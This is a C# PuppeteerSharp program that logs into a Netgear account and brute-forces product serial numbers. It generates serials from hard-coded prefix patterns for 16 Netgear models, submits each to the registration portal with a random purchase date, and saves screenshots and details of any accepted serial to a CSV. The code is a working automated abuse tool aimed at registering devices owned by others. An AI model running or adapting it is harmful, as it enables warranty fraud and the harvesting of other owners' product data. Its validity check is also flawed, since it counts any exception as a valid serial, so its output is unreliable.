using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using PuppeteerSharp;

namespace NetgearHammerv2 {
    class Program {

        static async Task Main (string[] args) {
            string rootfilename = Path.GetDirectoryName (Assembly.GetEntryAssembly ().Location);
            Console.WriteLine($"Current Working Directory: {rootfilename}");

            string filename = rootfilename + "\\output.csv";
            Console.WriteLine($"Output will be saved at: {filename}.");

            Console.WriteLine ("Enter desired number of attempts (ex. 200):" + Environment.NewLine);
            var attemptsCount = Console.ReadLine ();

            Console.WriteLine ("Running through " + attemptsCount.ToString () + " iterations, now select your desired prodcut...." + Environment.NewLine + " (1) ReadyNAS RNDP6000" + " (2) ReadyNAS 516" + " (3) ReadyNAS 716X" + " (4) R8000 Router" + " (5) R8500 Router" + " (6) A6210 WiFi USB Adapter" + " (7) ProSAFE M7300-24XF Switch" + " (8) ReadyNAS 526X" + " (9) ReadyNAS 528X" + " (10) R9000 Router" + " (11) ProSAFE XS728T Switch" + " (12) ProSAFE XS748T Switch" + " (13) ReadyNAS 3312" + " (14) ReadyNAS RN626X00" + " (15) ReadyNAS RR4312X" + " (16) ReadyNAS RR4360X" + Environment.NewLine);
            var productChoice = Console.ReadLine ();

            Console.WriteLine ("Enter netgear email address: ");
            var emailAddress = Console.ReadLine ().Trim ();

            Console.WriteLine ("Enter password: ");
            var password = Console.ReadLine ().Trim ();

            int invalidCounter = 0;

            // Use puppeteer for automation
            await new BrowserFetcher ().DownloadAsync (BrowserFetcher.DefaultRevision);
            var browser = await Puppeteer.LaunchAsync (new LaunchOptions {
                Headless = false
            });

            var page = await browser.NewPageAsync ();
            // accept any dialog prompts
            page.Dialog += async (sender, e) =>
            {
                Console.WriteLine("Intercepted dialog!");
                var msg = e.Dialog.Message;
                Console.WriteLine(msg);

                await e.Dialog.Dismiss();
            };

            await page.SetUserAgentAsync ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36");
            await page.GoToAsync ("https://accounts.netgear.com/login?redirectUrl=https:%2F%2Fwww.netgear.com%2Fmynetgear%2Fregistration%2Flogin.aspx");
            await page.WaitForSelectorAsync ("#\\_ipEmlLgn");

            await page.TypeAsync ("#\\_ipEmlLgn", emailAddress);
            await page.TypeAsync ("#searchinput", password);
            await page.ClickAsync ("#Login-btn > span");
            await page.WaitForNavigationAsync ();

            StringBuilder validserials = new StringBuilder ();
            for (int i = 0; i < Convert.ToInt32 (attemptsCount); i++) {
                // Generate serial
                string tempSerial = GenerateSerial (productChoice);

                // Check serial validity
                var result = await checkSerial (tempSerial, page);

                if (result.Contains("None")) {
                    invalidCounter++;
                } else {
                    Console.WriteLine ($"[+] Valid Serial: {tempSerial}");
                    var productData = await extractData(tempSerial, page);

                    Console.WriteLine($"Extracted product details: {productData}");
                    validserials.AppendLine (tempSerial + "," + productData);
                }

            }

            // write to csv
            File.AppendAllText(filename, validserials.ToString());

            Console.WriteLine ("We found " + invalidCounter.ToString () + " invalid serials out of the total attempt count of " + attemptsCount.ToString ());

        }

        static async Task<string> extractData(string serialNumber, Page page) {
            await page.GoToAsync("https://www.netgear.com/mynetgear/portal/myProducts.aspx");
            await page.WaitForSelectorAsync(".product-table");

            await page.EvaluateExpressionAsync<dynamic>($"javascript:ShowInfo('{serialNumber}')");
            await page.WaitForTimeoutAsync(5000);

            string rootfilename = Path.GetDirectoryName (Assembly.GetEntryAssembly ().Location);
            await page.ScreenshotAsync($"{rootfilename}\\{serialNumber}.png");

            var productData = await page.EvaluateExpressionAsync<dynamic>("document.querySelector('#formPop').innerText");
            return productData;
        }

        static async Task<string> checkSerial (string serialNumber, Page page) {
            string productInfo = "None";

            try {
            await page.GoToAsync ("https://www.netgear.com/mynetgear/portal/myRegister.aspx");
            await page.WaitForSelectorAsync ("#MainContent_serial");

            string[] days = {
                "08",
                "09",
                "10",
                "11",
                "12",
                "13",
                "14",
                "15",
                "16",
                "17",
                "18",
                "19",
                "20",
                "21",
                "22",
                "23",
                "24",
                "25",
                "26",
                "27",
                "28",
                "29",
                "30",
                "31",
            };
            string[] months = {
                "03",
            };
            string[] years = {
                "2021",
            };

            Random rand = new Random();
            int dayIndex = rand.Next(days.Length);
            int monthIndex = rand.Next(months.Length);
            int yearIndex = rand.Next(years.Length);

            await page.TypeAsync ("#MainContent_serial", serialNumber);
            await page.SelectAsync ("#MainContent_ddlMonth", $"{months[monthIndex]}");
            await page.SelectAsync ("#MainContent_ddlDay", $"{days[dayIndex]}");
            await page.SelectAsync ("#MainContent_ddlYear", $"{years[yearIndex]}");

            await page.ClickAsync ("#MainContent_btnSubmit");
            await page.WaitForTimeoutAsync(3500);

            var result = await page.EvaluateExpressionAsync<dynamic>("((document.querySelector('#MainContent_lblError,.activeServerError') || {}).innerText || '').trim();");

            if (result.IndexOf ("not valid") > 0 || result.IndexOf("invalid") > 0 || result.indexOf("already registered") > 0) {
                Console.WriteLine ($"[-] Invalid Serial: {serialNumber}");
                await page.ClickAsync ("a.popup-close");
            }
            } catch (Exception e) {
                Console.WriteLine(e.Message);
                productInfo = "VALID";
            }

            return productInfo;
        }
        static string GenerateSerial (string productID) {
            switch (productID) {
                //Netgear utilizes a pre-fixed serial number system wherein the first three characters identify the product class when combined with another sequence of two characters later in the serial number.
                case "1":
                    return "20S" + RandomNum (3) + "RV" + RandomNum (5);
                case "2":
                    return "3C8" + RandomNum (3) + "06" + RandomNum (5);
                case "3":
                    return "3PA" + RandomNum (3) + "CA" + RandomNum (5);
                case "4":
                    return "3W7" + RandomNum (3) + "7E" + RandomNum (5);
                case "5":
                    return "4DG" + RandomNum (3) + "7W" + RandomNum (5);
                case "6":
                    return "484" + RandomNum (3) + "5R" + RandomNum (5);
                case "7":
                    return "2ER" + RandomNum (3) + "5A" + RandomNum (5);
                case "8":
                    return "4MC" + RandomNum (3) + "EV" + RandomNum (5);
                case "9":
                    return "4VB" + RandomNum (3) + "E8" + RandomNum (5);
                case "10":
                    return "4MY" + RandomNum (3) + "5Y" + RandomNum (5);
                case "11":
                    return "49E" + RandomNum (3) + "5T" + RandomNum (5);
                case "12":
                    return "4M0" + RandomNum (3) + "5R" + RandomNum(5);
                case "13":
                    return "4US" + RandomNum(3) + "ER" + RandomNum(5);
                case "14":
                    return "4MD" + RandomNum(3) + "EC" + RandomNum(5);
                case "15":
                    return "4UT" + RandomNum(3) + "ES" + RandomNum(5);
                case "16":
                    return "4VW" + RandomNum(3) + "E8" + RandomNum(5);
                default:
                    return "Invalid type specified.";

            }

        }
        static string RandomNum (int length) {
            StringBuilder sb = new StringBuilder ();
            Random r = new Random ();
            for (int i = 0; i < length; i++) {
                sb.Append (r.Next (1, 10));
            }
            return sb.ToString ();
        }
    }
}